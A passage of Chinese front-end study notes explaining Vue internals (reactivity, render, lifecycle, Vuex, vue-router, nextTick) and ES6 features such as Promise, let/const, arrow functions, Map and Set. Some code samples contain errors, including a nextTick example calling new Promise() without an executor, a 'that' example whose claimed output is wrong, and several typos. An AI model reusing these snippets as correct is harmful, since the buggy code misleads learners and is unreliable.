从中起到一个连接桥的作用。 核心 响应式：vue如何监听data的属性变化假设 data 开始是这样的： 1234var obj = &#123; name: 'zhangsan', age: 25&#125; 当执行修改操作，如下： 12console.log(obj.name) // 访问obj.age = 22; // 修改 但是这样的操作vue本身是没有办法感知到的，那么应该如何让vue知道我们进行了访问或是修改的操作呢？那就要使用 Object.defineProperty 1234567891011Object.defineProperty(obj, prop, descriptor)/* obj: 对象 prop: 属性 descriptor: 属性描述符 数据描述符、存取描述符共有: configurable、enumerable 数据描述符: value、writable var obj = &#123; a: 1 &#125; Object.defineProperty(obj, 'a', &#123; value: 2 &#125;) 存取描述符: get、set，vue的监听变化实际就是通过这个get和set实现的*/ 123456789101112131415161718192021var data = &#123; name: 'zhangsan', age: 20&#125;var key, valuefor (key in data) &#123; // 遍历data中所有的字段 (function (key) &#123; Object.defineProperty(data, key, &#123; // 当只是一个修改值时，此处写value: newValue即可 get: function () &#123; console.log('get', data[key]) // 监听 return data[key] &#125;, set: function (newVal) &#123; console.log('set', newVal) // 监听 data[key] = newVal &#125; &#125;) &#125;)(key)&#125; 通过 Object.defineProperty 将data里的每一个属性的访问与修改都变成了一个函数，在函数get和set中我们即可监听到data的属性发生了改变。 模板解析：vue的模板是如何被解析的模板本质上是一串字符串，它看起来和 html 的格式很相像，实际上有很大的区别，因为模板本身还带有逻辑运算，比如 v-if，v-for 等等，但它最后还是要转换为 html 来显示。 1234567891011&lt;div id="app"&gt; &lt;div&gt; &lt;input v-model="title"&gt; &lt;button v-on:click="add"&gt;submit&lt;/button&gt; &lt;/div&gt; &lt;div&gt; &lt;ul&gt; &lt;li v-for="item in list"&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; 模板在 vue 中必须转换为 JS 代码，原因在于：在前端环境下，只有 JS 才是一个图灵完备语言，才能实现逻辑运算，以及渲染为 html 页面。 这里就引出了vue中一个特别重要的函数——render render 函数中的核心就是 with 函数。 with: with函数将某个对象添加到作用域链的顶部，如果在 statement中有某个未使用命名空间的变量，跟作用域链中的某个属性同名，则这个变量将指向这个属性值。 上例中使用 with 解析的过程如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556with(this)&#123; // this 就是 vm return _c( 'div', &#123; attrs:&#123;"id":"app"&#125; &#125;, [ _c( 'div', [ _c( 'input', &#123; directives:[ &#123; name:"model", rawName:"v-model", value:(title), expression:"title" &#125; ], domProps:&#123; "value":(title) &#125;, on:&#123; "input":function($event)&#123; if($event.target.composing)return; title=$event.target.value &#125; &#125; &#125; ), _v(" "), _c( 'button', &#123; on:&#123; "click":add &#125; &#125;, [_v("submit")] ) ] ), _v(" "), _c('div', [ _c( 'ul', _l((list),function(item)&#123;return _c('li',[_v(_s(item))])&#125;) ) ] ) ] )&#125; 其中的 _c 函数表示的是创建一个新的html元素，其基本用法为： 1_c(element,&#123;attrs&#125;,[children...]) 其中的element表示所要创建的html元素类型，attrs表示所要创建的元素的属性，children表示该html元素的子元素。 _v 函数表示创建一个文本节点，_l 函数表示创建一个数组。 最终render函数返回的是一个虚拟DOM。 渲染：vue模板是如何被渲染成HTML的 模板渲染为html分为两种情况: 1、初次渲染的时候2、渲染之后数据发生改变的时候 它们都需要调用updateComponent,其形式如下： 12345678910111213vm._update(vnode)&#123; const prevVnode = vm._vnode vm._vnode = vnode if (!prevVnode)&#123; vm.$el = vm.__patch__(vm.$el,vnode) &#125; else &#123; vm.$el = vm.__patch__(prevVnode,vnode) &#125;&#125;function updateComponent()&#123; vm._update(vm._render())&#125; 首先读取当前的虚拟DOM——vm._vnode,判断其是否为空，若为空，则为初次渲染，将虚拟DOM全部渲染到所对应的容器当中（vm.$el），若不为空，则是数据发生了修改，通过响应式我们可以监听到这一情况，使用diff算法完成新旧对比并修改。 好处 低耦合 可重用 独立开发 易测试 Vue双向绑定原理 参考：segmentfault 剖析Vue原理&amp;实现双向绑定MVVM、vue的双向绑定原理及实现 通过 Object.defineProperty() 来劫持各个属性的setter，getter在数据变动时给订阅者发送消息，触发相应的监听回调.Vue 会把props、data 等变成响应式对象，在创建过程中，发现子属性也为对象则会递归把该对象也变成响应式。1234567891011121314151617181920var data = &#123; name: 'zhangsan', age: 20&#125;var key, valuefor (key in data) &#123; // 遍历data中所有的字段 (function (key) &#123; Object.defineProperty(data, key, &#123; get: function () &#123; console.log('get', data[key]) // 监听 return data[key] &#125;, set: function (newVal) &#123; console.log('set', newVal) // 监听 data[key] = newVal &#125; &#125;) &#125;)(key)&#125; 实现一个数据监听器 Observer，能够对数据对象的所有属性进行监听，如果有变动则拿到最新值并通知订阅者。 实现一个指令解析器 Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图 实现一个 Watcher，作为链接 Observer 和 Compile 的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图。 Vue生命周期(v2.0) 生命周期 表现 beforeCreate 组件实例刚被创建，组件属性计算之前，如data属性 created 组件实例创建完成，属性已绑定，但是DOM还未生成，$el属性还不存在 beforeMount 模板编译/挂载之前 mounted 模板编译/挂载之后 beforeUpdate 组件更新之前 updated 组件更新之后 activated for keep-alive，组件被激活时调用 deactivated for keep-alive，组件被移除时调用 beforeDestory 组件销毁前 destoryed 组件销毁后 Vuex原理组件触发事件，通过 dispatch 来触发 actions 中的方法 actions 中的 commit 会触发 mutations 中的方法 mutation 就会去改变 state state 相应到变化后，触发 Render 更新 其他的组件通过 getters 中的方法来获取 state Store.js12345678910111213141516171819202122232425const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, // this.$store.commit('increment') 触发mutation中的方法 // state的值只能通过mutations来修改 mutations: &#123; increment(state) &#123; state.count++ &#125; &#125;, // this.$store.dispatch('increment')来触发actions中的方法 actions: &#123; increment(&#123;commit&#125;) &#123; commit("increment"); // this.$store.commit("increment") 触发mutations中的increment &#125; &#125;, // 任意组件通过 this.$store.getters.getCount来获取状态 getters: &#123; getCount(state) &#123; return state.count &#125; &#125;&#125;)export default store App.vue1234567891011121314151617&lt;template&gt; &lt;div id="app"&gt; &lt;button @click="increment"&gt;增加&lt;/button&gt; &lt;!-- 有时候不能直接 强制使用store里面的状态 this.$store.state.count --&gt; &#123;&#123;this.$store.getters.getCount&#125;&#125; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;export default &#123; methods: &#123; increment()&#123; this.$store.dispatch("increment") // this.$store.dispatch("increment") 触发actions函数"increment" &#125; &#125;&#125;&lt;/script&gt; 另外，vuex 提供了 mapState、mapGetters、mapActions、mapMutations 这些辅助函数 mapState 混入到某个组件的 computed 中1234567891011121314import &#123; mapState &#125; from 'vuex'export default &#123; // ... computed: &#123; ...mapState(&#123; // 当计算属性的名字和子节点名称相同时，可直接写字符串，相当于：count: state =&gt; state.count 'count', // 重命名 leftCount: state =&gt; state.count &#125;) &#125;] mapGetters 混入到某个组件的 computed 中，同 mapGetters1234567891011121314import &#123; mapGetters &#125; from 'vuex'export default &#123; // ... computed: &#123; ...mapGetters(&#123; // 原名 'leftCount', // 重命名，把 `this.doneCount` 映射为 `this.$store.getters.doneTodosCount` doneCount: 'doneTodosCount' &#125;) &#125;] mapActions 混入到某个组件的 methods 中123456789101112131415import &#123; mapActions &#125; from 'vuex'export default &#123; // ... methods: &#123; ...mapActions(&#123; // 把 `this.increment()` 映射为 `this.$store.dispatch('incrementAct')` increment: 'incrementAct', // `mapActions` 也支持载荷（参数）： // 把 `this.incrementBy(amount)` 映射为 `this.$store.dispatch('incrementBy', amount)` 'incrementBy' &#125;) &#125;&#125; mapMutations 混入到某个组件的 methods 中，同 mapActions123456789101112131415import &#123; mapMutations &#125; from 'vuex'export default &#123; // ... methods: &#123; ...mapMutations(&#123; // 把 `this.increment()` 映射为 `this.$store.dispatch('incrementAct')` increment: 'incrementAct', // `mapMutations` 也支持载荷（参数）： // 把 `this.incrementBy(amount)` 映射为 `this.$store.dispatch('incrementBy', amount)` 'incrementBy' &#125;) &#125;&#125; Q&amp;A 为什么要先 dispatch 触发actions中的方法，再去调用 mutations 中的方法，而非一步搞定。mutation 必须同步执行，actions 可以异步执行。1234567actions: &#123; incrementAsync (&#123; commit &#125;) &#123; setTimeout(() =&gt; &#123; commit('increment') &#125;, 1000) &#125;&#125; 见vuex组件间通信 vue-router 原理原理核心就是 更新视图但不重新请求页面。 VueRouter包括三个主要组成部分： VueRouter: 路由类，根据路由请求在路由视图中动态渲染选中的组件 router-link: 路由链接组件，声明用以提交路由请求的用户接口 router-view: 路由视图组件，负责动态渲染路由选中的组件 提供三种运行模式： hash模式: 使用 URL hash 值来作路由。默认模式。hash即浏览器url中#后面的内容，包含#。#是用来指导浏览器动作的，对服务器端完全无用，HTTP请求中，不包含#。每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用”后退”按钮，就可以回到上一个位置。 history模式: 依赖 HTML5 History API 和服务器配置。history.pushState API 来完成 URL 跳转而无须重新加载页面。 abstract模式: 支持所有 JavaScript 运行环境，如 Node.js 服务器端abstract模式是使用一个不依赖于浏览器的浏览历史虚拟管理后端。vue-router 自身会对环境做校验，如果发现没有浏览器的 API，vue-router 会自动强制进入 abstract 模式，所以 在使用 vue-router 时只要不写 mode 配置即可，默认会在浏览器环境中使用 hash 模式，在移动端原生环境中使用 abstract 模式。 （当然，你也可以明确指定在所有情况下都使用 abstract 模式）。 Vue nextTick实现原理在浏览器环境 nextTick 是使用 es6 的Promise来实现的，在不支持 Promise 的环境，优先使用 setImmediate，如果 setImmediate 也不支持则使用 setTimeout setImmediate:该方法用来把一些需要长时间运行的操作放在一个回调函数里，在浏览器完成后面的语句后，就立即执行这个回调函数。 12345678910111213141516171819202122232425262728293031// 不考虑兼容，实现一个nextTick方法fucntion myNextTick(flushCallbacks) &#123; return Promise.resolve().then(() =&gt; &#123; flushCallbacks() &#125;)&#125;)// Vue nextTick 实现function myNextTick (flushCallbacks) &#123; let timerFunc if (typeof Promise !== 'undefined')&#123; // 支持 Promise 的环境 const p = new Promise() timerFunc = () =&gt; &#123; p.then(flushCallbacks) &#125; &#125; else if (typeof setImmediate !== 'undefined') &#123; // 支持 setImmediate 的环境 timerFunc = () =&gt; &#123; setImmediate(flushCallbacks) &#125; &#125; else &#123; timerFunc = () =&gt; &#123; setTimeout(flushCallbacks, 0) &#125; &#125;&#125;function isNative (Ctor) &#123; return typeof Ctor === 'function' &amp;&amp; /native code/.test(Ctor.toString())&#125; Promise原理Promise是为了解决异步编程出现的地狱回调问题而提出来的。 Promise 三种状态：pending、resolve、reject 优点：Promise其实就是做了一件事情，它是对异步操纵进行了封装，然后可以将异步操纵以同步的流程表达出来，避免了层层嵌套的回调函数，同时提供了统一的接口，使得控制异步操纵更加容易。 缺点： 无法取消Promise，一旦被创建它就会立刻去执行，无法中途取消 如果不设置回调函数，Promise内部的错误无法反应到外部 当处于未完成状态时，无法得知目前进行到哪个状态。 12345678910111213141516const getData = new Promise((resolve, reject) =&gt; &#123; setTimetout(() =&gt; &#123; resolve(&#123; status: 1, data: &#123;&#125; &#125;) &#125;, 1000)&#125;)getData .then(res =&gt; &#123; &#125;) .catch(err =&gt; &#123; &#125;) .finally(() =&gt; &#123; &#125;) 如何手动中断呢？ 原理：新增一个 promise，通过 Promise.race 进行控制，中断时控制的其实是另外一个 promise123456789101112131415161718192021222324252627282930313233// Promise.race: 有一个成功即成功，有一个失败即失败function PromiseFn (p1) &#123; let abort const p2 = new Promise((resolve, reject) =&gt; &#123; abort = () =&gt; &#123; reject() &#125; &#125;) const promise = Promise.race([p1, p2]) promise.abort = abort return promise&#125;// 模拟请求花费5s时间const request = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve('success') &#125;, 5000)&#125;)const promise = PromiseFn(request)promise.then((req) =&gt; &#123; console.log(req)&#125;).catch((err) =&gt; &#123; console.log(err)&#125;)// 模拟2s后手动中断请求setTimeout(() =&gt; &#123; promise.abort()&#125;, 2000) html2canvas原理它的原理是将 Dom 节点在 Canvas 里边画出来。虽然很方便，但有以下限制： 不支持 iframe 不支持跨域图片 不能在浏览器插件中使用 部分浏览器上不支持 SVG 图片 不支持 Flash 不支持古代浏览器和 IE SVG和Canvas的区别SVG SVG 是一种使用 XML 描述 2D 图形的语言。 不依赖分辨率 支持事件处理器 最适合带有大型渲染区域的应用程序（比如谷歌地图） 复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快） 不适合游戏应用 Canvas Canvas 通过 JavaScript 来绘制 2D 图形。 依赖分辨率，逐像素进行渲染 不支持事件处理器 弱的文本渲染能力 能够以 .png 或 .jpg 格式保存结果图像 最适合图像密集型的游戏，其中的许多对象会被频繁重绘 Canvas 通过 JavaScript 来绘制 2D 图形。SVG 是基于形状的保留模式图形系统，更加适合较大的表面或较小数量的对象。Canvas 和 SVG 在修改方式上还存在着不同。绘制 Canvas 对象后，不能使用脚本和 CSS 对它进行修改。因为 SVG 对象是文档对象模型的一部分，所以可以随时使用脚本和 CSS 修改它们。 es6常用语法let、const、模板字符串、箭头函数、字符串方法、数组方法、Promise()方法、Map、Set等 let的特点 只在代码块内有效 不存在变量提升（只能先声明后使用）（变量提升指变量在声明之前使用，值为ReferenceError） 1234567// var 的情况console.log(foo); // 输出undefinedvar foo = 2;// let 的情况console.log(bar); // 报错ReferenceErrorlet bar = 2; 不允许重复申明（不允许在相同作用域内重复声明同一个变量） 1234567891011// 报错function () &#123; let a = 10; var a = 1;&#125;// 报错function () &#123; let a = 10; let a = 1;&#125; 123456789function func(arg) &#123; let arg; // 报错&#125;function func(arg) &#123; &#123; let arg; // 不报错 &#125;&#125; let新增块级作用域 const的特点 const声明一个只读的常量，一旦声明，常量的值就不能改变 12345const PI = 3.1415;PI // 3.1415PI = 3;// TypeError: Assignment to constant variable. const一旦声明变量，就必须立即初始化，不能等到以后赋值 12const foo;// SyntaxError: Missing initializer in const declaration 只在声明所在的块级作用域内有效 12345if (true) &#123; const MAX = 5;&#125;MAX // Uncaught ReferenceError: MAX is not defined 不存在变量提升 只能先声明后使用 不允许重复声明 对于复合类型的变量，变量名不指向数据，而是指向数据所在的地址。即const命令只是保证变量名指向的地址不变，而不是保证数据不变，所以使用const声明为常量必须小心。 12345const foo = &#123;&#125;;foo.prop = 123;foo.prop// 123foo = &#123;&#125;; // TypeError: "foo" is read-only 常量foo存储的是一个地址，这个地址指向一个对象。所谓不可变的是这个地址，不能把foo指向另一个地址，但是该对象本身是可变的，可以为这个对象添加新属性等 箭头函数和普通函数的区别 参考：简书 ES6箭头函数与普通函数的区别 this指向问题 1、普通函数 123456789101112131415var a = 3;var obj = &#123; a : 1, foo : function()&#123; console.log(this, this.a); &#125;&#125;obj.foo(); // 1var bar = obj;bar.a = 2;bar.foo(); // 2var baz = obj.foo;baz(); // 3 1.）直接通过 obj 调用其中的方法 foo，此时，this 就会指向调用 foo 函数的对象，也就是 obj;2.）将 obj 对象赋给一个新的对象 bar，此时通过 bar 调用 foo 函数，this 的值就会指向调用者 bar；3.）将 obj.foo 赋给一个新对象 baz，通过 baz() 调用 foo 函数，此时的 this 指向 window； 由此我们可以得出结论： 普通函数的 this 总是指向它的直接调用者。在严格模式下，没找到直接调用者，则函数中的 this 是 undefined。在默认模式下（非严格模式），没找到直接调用者，则函数中的 this 指向 window。 再考虑一下以下的情况： 123456789var obj = &#123; a : 1, foo : function()&#123; setTimeout(function()&#123; console.log(this.a); &#125;, 3000); &#125;&#125;;obj.foo(); //undefined 在上例中 setTimeout 中的 function 未被任何对象调用，因此它的 this 指向还是 window 对象。 对于方法（即通过对象调用了该函数），普通函数中的 this 总是指向它的调用者。对于一般函数，this 指向全局变量（非严格模式下）或者 undefined（严格模式下）。 假设我么需要在上例中的 setTimeout 中使用 this 要怎么做呢，在 es5 的时代可以这样做：1.）使用一个变量 that 先接收一遍 this 12345678910var obj = &#123; a : 1, foo : function()&#123; var that = this; // 先使用一个变量接收this setTimeout(function()&#123; console.log(this.a); &#125;, 3000); &#125;&#125;;obj.foo(); // 1 2.）使用 bind 给 setTimeout 绑定 this 123456789var obj = &#123; a : 1, foo : function()&#123; setTimeout(function()&#123; console.log(this.a); &#125;.bind(this), 3000); &#125;&#125;;obj.foo(); // 1 而 es6 可以如何实现这块呢，请继续往下看： 2、箭头函数 1() =&gt; &#123; console.log(this) &#125; 箭头函数中没有自己的 this、arguments、new target（ES6）和 super(ES6);箭头函数相当于匿名函数，因此不能使用 new 来作为构造函数使用。箭头函数中的 this 始终指向其父级作用域中的 this， call()、apply()、 bind() 都无法改变 this 指向 请看如下代码： 12345678910111213141516171819202122var obj = &#123; a: 10, b: () =&gt; &#123; console.log(this.a); // undefined console.log(this); // Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, frames: Window, …&#125; &#125;, c: function() &#123; console.log(this.a); // 10 console.log(this); // &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125; &#125;, d: function()&#123; console.log(this.a); // 10 console.log(this); // &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125; return () =&gt; &#123; console.log(this.a); // 10 console.log(this); // &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125; &#125; &#125;,&#125;obj.b(); obj.c();obj.d()(); obj.b() 中的 this 会继承父级上下文中的 this 值，也就是与 obj 有相同的 this 指向，为全局变量 window;obj.c() 的 this 指向即为调用者 obj;obj.d()() 中的 this 也继承自父级上下文中的 this，即d的 this 指向，也就是 obj。 参数1、示例 普通函数可以使用 arguments 来获取不定参数，输出的是一个数组，如 1234function funcA(a) &#123; console.log(arguments); // output: Arguments(3) [1, 2, 3, callee: ƒ, Symbol(Symbol.iterator): ƒ]&#125;funcA(1, 2, 3); es6 提供了 rest 方式来获取，即 ... 符号，如： 1234const funcB = (...params) =&gt; &#123; console.log(params); // output: [1, 2, 3]&#125;funcB(1, 2, 3); 1234const funcC = (a, ...params) =&gt; &#123; console.log(params); // output: [2, 3]&#125;funcC(1, 2, 3); 1234const funcC = (a, ...params, b) =&gt; &#123; console.log(params); // output: Rest parameter must be last formal parameter&#125;funcC(1, 2, 3); 2、区别：1.） arguments 包含所有参数，rest 参数只包括那些没有给出名称的参数（前面的参数展示 m 个，reset 就占 n - m 个）2.）arguments 对象不是真正的数组，而 rest 参数是数组实例，可以直接应用 sort、map、forEach、pop等方法3.）将 arguments 转换成普通的数组 1234567891011121314151617function funcD(a, b) &#123; console.log(arguments); // [1, 2, callee: ƒ, Symbol(Symbol.iterator): ƒ] // arguments作为参数传给Array的concat方法: [].concat(arguments) console.log([].concat.apply([], arguments)) console.log(Array.prototype.concat.apply([], arguments)) // arguments调用Array的slice方法: arguments.slice()、arguments.slice(0) console.log([].slice.call(arguments)) console.log(Array.prototype.slice.call(arguments)) console.log([].slice.call(arguments, 0)) console.log(Array.prototype.slice.call(arguments, 0)) // 全部输出 [1, 2]&#125;funcD(1,2) 使用Promise自己封装一个Ajax插件我们知道 Promise 会接收两个参数，resolve (成功)和 reject (失败)，我们可以用这两个参数代替 ajax 的 success 和 error，并使用链式调用， then 里面执行成功的操作，catch里面执行错误的信息。123456789101112131415161718192021222324252627282930313233const $ajax = function(url, data) &#123; return new Promise((resolve, reject) =&gt; &#123; // 创建 XMLHttpRequest对象,用于在后台与服务器交换数据。 let request = new XMLHttpRequest() //设置向服务器提交的方式 request.open("GET", url, true) request.responseType = 'json' request.setRequestHeader("Accept", "application/json") // onreadystatechange捕获事件请求的状态 request.onreadystatechange = function handlerRequest() &#123; //readyState为4的时候，代表请求操作已经完成，这意味着数据传输已经彻底完成或失败。 if (this.readyState === 4) &#123; //请求成功 if (this.status === 200) &#123; resolve(this.response) &#125; else &#123; reject(new Error(this.statusText)) &#125; &#125; &#125; //发送 HTTP 请求,默认异步请求 request.send(data); // data的格式: name1=value1&amp;name2=value2 &#125;)&#125; $ajax("http://www.phonegap100.com/appapi.php?a=getPortalList&amp;catid=20&amp;page=1", '') .then((resolve) =&gt; &#123; console.log(resolve) &#125;) .catch((reject) =&gt; &#123; console.log(reject) &#125;); 常用的字符串方法 at(): 返回给定字符的位置 12var s = 'Hello world!';s.at(0) // H includes(): 是否包含指定字符串，第二个参数可选，表示起始查找位置 startsWith(): 参数是否在头部，第二个参数可选，表示起始查找位置 endsWith(): 参数是否在尾部，第二个参数可选，表示起始查找位置 123456789var s = 'Hello world!';s.startsWith('Hello') // trues.endsWith('!') // trues.includes('o') // truevar s = 'Hello world!';s.startsWith('world', 6) // trues.endsWith('Hello', 5) // trues.includes('Hello', 6) // false repeat(): 返回重复多次后的字符串 12345678var s = 'Hello's.repeat(3) // HelloHelloHellos.repeat(2.9) // HelloHello，参数为小数时为取整次数s.repeat(Infinity) // 报错s.repeat(-1) // 报错s.repeat(-0.8) // ""，-1~0取整后为0s.repeat("2") // HelloHell0，字符串先转换成数字再取整s.repeat("world") // "" padStart(): 头部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补 padEnd(): 尾部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补 123456789101112131415161718var s = 'x's.padStart(5, 'ab') // 'ababx's.padStart(4, 'ab') // 'abax's.padStart(4, 'abcdefg') // 'abcx' ，多余的会被去掉s.padEnd(5, 'ab') // 'xabab's.padEnd(4, 'ab') // 'xaba' s.padEnd(4, 'abcdefg') // 'xabc' ，多余的会被去掉var s = 'xxxx's.padStart(2, 'ab') // 'xxxx'，当设置的字符串长度小于原本长度，返回原字符串s.padEnd(4, 'ab') // 'xxxx' ，当设置的字符串长度小于原本长度，返回原字符串var s = 'x's.padStart(3) // ' x's.padEnd(4) // 'x '常用来补全位数：'10'.padStart(10, '0') // "0000000010" 模板字符串 常用的数组方法 Array.from()：将两类对象（类似数组的对象和可遍历的对象）转为真正的数组 123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法：var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法：let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] Array.of()：将一组值转换成数组 123456789Array.of(3, 11, 8) // [3,11,8]Array.of(3) // [3]Array.of(3).length // 1Array.of() // []Array.of(undefined) // [undefined] copyWithin()：将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组Array.prototype.copyWithin(target, start = 0, end = this.length) target（必需）：从该位置开始替换数据。 start（可选）：从该位置开始读取数据，默认为0。如果为负值，表示倒数。 end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示倒数。正从0开始，负从-1开始。 这三个参数都应该是数值，如果不是，会自动转为数值。 1234567891011121314151617181920[1, 2, 3, 4, 5].copyWithin(0, 3) // [4, 5, 3, 4, 5]// 从3号位直到数组结束的成员（4和5），复制到从0号位开始的位置，结果覆盖了原来的1和2[1, 2, 3, 4, 5].copyWithin(0, 3, 4) // [4, 2, 3, 4, 5]// 将3号位复制到0号位[1, 2, 3, 4, 5].copyWithin(0, -2, -1) // [4, 2, 3, 4, 5]// -2相当于3号位，-1相当于4号位[].copyWithin.call(&#123;length: 5, 3: 1&#125;, 0, 3) // &#123;0: 1, 3: 1, length: 5&#125;// 将3号位复制到0号位var i32a = new Int32Array([1, 2, 3, 4, 5]); i32a.copyWithin(0, 2); // Int32Array [3, 4, 5, 4, 5]// 将2号位到数组结束，复制到0号位// 对于没有部署TypedArray的copyWithin方法的平台// 需要采用下面的写法:[].copyWithin.call(new Int32Array([1, 2, 3, 4, 5]), 0, 3, 4); // Int32Array [4, 2, 3, 4, 5] find()：用于找出第一个符合条件的数组成员 1234567[1, 4, -5, 10, -1].find((n) =&gt; n &lt; 0) // -5// 找出数组中第一个小于0的成员，-1布什第一个，不返回。[1, 5, 10, 15].find(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 10// 找出大于9的，15不是第一个，不返回 findIndex()：返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1 1234567[1, 5, 10, 15].findIndex(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 2[NaN].indexOf(NaN) // -1[NaN].findIndex(y =&gt; Object.is(NaN, y)) // 0 fill()：使用给定值，填充一个数组第二个参数（可选）表示替换起始位置，第三个参数（可选），表示结束位置 12345['a', 'b', 'c'].fill(7) // [7, 7, 7]new Array(3).fill(7) // [7, 7, 7]['a', 'b', 'c'].fill(7, 1, 2) // ['a', 7, 'c'] includes()：是否包含指定元素，es7语法，babel转换器已支持第二个参数可选，表示指定搜索起始位置，从起始位置到结尾，默认为0，负数表示倒数；当大于数组长度，会重置为从0开始 12345678910111213141516171819202122232425262728[1, 2, 3].includes(2); // true[1, 2, 3].includes(4); // false[1, 2, NaN].includes(NaN); // true[1, 2, 3].includes(3, 3); // false[1, 2, 3].includes(3, -1); // true[1, 2, 3].includes(2, 0); // true[1, 2, 3].includes(2, 1); // true[1, 2, 3].includes(2, 2); // false[1, 2, 3].includes(2, 3); // false[1, 2, 3].includes(2, -1); // false[1, 2, 3].includes(2, -2); // true[1, 2, 3].includes(2, -3); // true[1, 2, 3].includes(2, -4); // true Map 含义和基本用法 JavaScript 的对象（Object），本质上是键值对的集合（Hash 结构），但是传统上只能用字符串当作键。这给它的使用带来了很大的限制。 为了解决这个问题，ES6 提供了 Map 数据结构。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。也就是说，Object 结构提供了“字符串—值”的对应，Map 结构提供了“值—值”的对应，是一种更完善的 Hash 结构实现。如果你需要“键值对”的数据结构，Map 比 Object 更合适。123456789const m = new Map();const o = &#123;p: 'Hello World'&#125;;m.set(o, 'content')m.get(o) // "content"m.has(o) // truem.delete(o) // truem.has(o) // false 作为构造函数，Map 也可以接受一个数组作为参数。该数组的成员是一个个表示键值对的数组。12345678910const map = new Map([ ['name', '张三'], ['title', 'Author']]);map.size // 2map.has('name') // truemap.get('name') // "张三"map.has('title') // truemap.get('title') // "Author" 当参数为数组是，其内部的逻辑如下：12345678910const items = [ ['name', '张三'], ['title', 'Author']];const map = new Map();items.forEach( ([key, value]) =&gt; map.set(key, value)); 如果读取一个未知的键，则返回 undefined。1new Map().get('asfddfsasadf'); // undefined 注意，只有对同一个对象的引用，Map 结构才将其视为同一个键。1234const map = new Map();map.set(['a'], 555);map.get(['a']) // undefined 上面代码的set和get方法，表面是针对同一个键，但实际上这是两个值，内存地址是不一样的，因此get方法无法读取该键，返回undefined。 同理，同样的值的两个实例，在 Map 结构中被视为两个键。1234567891011const map = new Map();const k1 = ['a'];const k2 = ['a'];map.set(k1, 111).set(k2, 222);map.get(k1) // 111map.get(k2) // 222 由上可知，Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。注意：以上说的只针对引用类型。 如果 Map 的键是一个简单类型的值（数字、字符串、布尔值），则只要两个值严格相等，Map 将其视为一个键，比如0和-0就是一个键，布尔值true和字符串true则是两个不同的键。另外，undefined和null也是两个不同的键。虽然NaN不严格相等于自身，但 Map 将其视为同一个键。 123456789101112131415let map = new Map();map.set(-0, 123);map.get(+0) // 123map.set(true, 1);map.set('true', 2);map.get(true) // 1map.set(undefined, 3);map.set(null, 4);map.get(undefined) // 3map.set(NaN, 123);map.get(NaN) // 123 Map 的属性或方法属性： size 属性12345const map = new Map();map.set('foo', true);map.set('bar', false);map.size // 2 方法： 操作方法 set(key, value)：设置键名key对应的键值为value，然后返回整个 Map 结构，即可以链式操作。 get(key)：读取key对应的键值，如果找不到key，返回undefined。 has(key)：查询某个键是否在当前 Map 对象之中，返回布尔值。 delete(key)：删除某个键，返回true。如果删除失败，返回false。 clear()：清除所有成员，没有返回值。 遍历方法 [Symbol.iterator]()： 返回键值的遍历器 keys()：返回键名的遍历器。 values()：返回键值的遍历器。 entries()：返回所有成员的遍历器。 forEach()：遍历 Map 的所有成员。12345678910111213141516171819202122232425262728293031const map = new Map([ ['F', 'no'], ['T', 'yes'],]);for (let key of map.keys()) &#123; console.log(key);&#125;// "F"// "T"for (let value of map.values()) &#123; console.log(value);&#125;// "no"// "yes"for (let item of map.entries()) &#123; console.log(item, item[0], item[1]);&#125;// ["F", "no"] "F" "no"// ["T", "yes"] "T" "yes"// 或者for (let [key, value] of map.entries()) &#123; console.log(key, value);&#125;// "F" "no"// "T" "yes"// 注意，for of遍历可使用break或continue跳出或跳过循环，for in遍历没有。 Map 结构转为数组结构，比较快速的方法是使用扩展运算符（…）1234567891011121314151617const map = new Map([ [1, 'one'], [2, 'two'], [3, 'three'],]);[...map.keys()]// [1, 2, 3][...map.values()]// ['one', 'two', 'three'][...map.entries()]// [[1,'one'], [2, 'two'], [3, 'three']][...map]// [[1,'one'], [2, 'two'], [3, 'three']] Set 含义和基本用法 ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值，我们可以利用 Set 的成员唯一性来实现数组的去重12345678910const s = new Set();[2, 3, 5, 4, 5, 2, 2].forEach(x =&gt; s.add(x));console.log([...s]); // [2, 3, 5, 4]for (let i of s) &#123; console.log(i);&#125;// 2 3 5 4 利用 Set 给数组或字符串去重12345[...new Set([2, 3, 5, 4, 5, 2, 2])]; // [2, 3, 5, 4]Array.from(new Set([2, 3, 5, 4, 5, 2, 2])); // 使用Array.from 将Set转换成数组[...new Set('2354522')].join(''); // "2354"Array.from(new Set('2354522')).join('') Set函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化。1234567891011121314151617181920// 例一const set = new Set([1, 2, 3, 4, 4]);[...set] // [1, 2, 3, 4]// 例二const items = new Set([1, 2, 3, 4, 5, 5, 5, 5]);items.size // 5// 例三const set = new Set(document.querySelectorAll('div')); // 